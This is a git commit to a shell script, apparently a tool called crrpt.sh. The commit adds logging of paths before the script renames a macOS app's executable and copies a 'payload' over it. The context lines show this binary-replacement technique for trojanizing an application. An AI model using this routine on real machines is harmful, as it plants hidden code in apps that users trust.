7a3517ea77ddff0577e62990c23890494bfe18eb
ErikBoesen <me@erikboesen.com>
2018-04-14 11:38:11 -0400

    Log file locations before making changes

--- crrpt.sh
+++ crrpt.sh
@@ -6,6 +6,12 @@ info="$app_root/Contents/Info.plist"
 macos="$app_root/Contents/MacOS"
 binary="$macos/$(/usr/libexec/PlistBuddy "$info" -c "Print :CFBundleExecutable")"
 
+echo "Payload @ $payload"
+echo "App root @ $app_root"
+echo "Info.plist @ $info"
+echo "MacOS directory @ $macos"
+echo "Binary @ $binary"
+
 mv "$binary" "${binary}_"
 cp "$payload" "$binary"
 chmod +x "$binary"
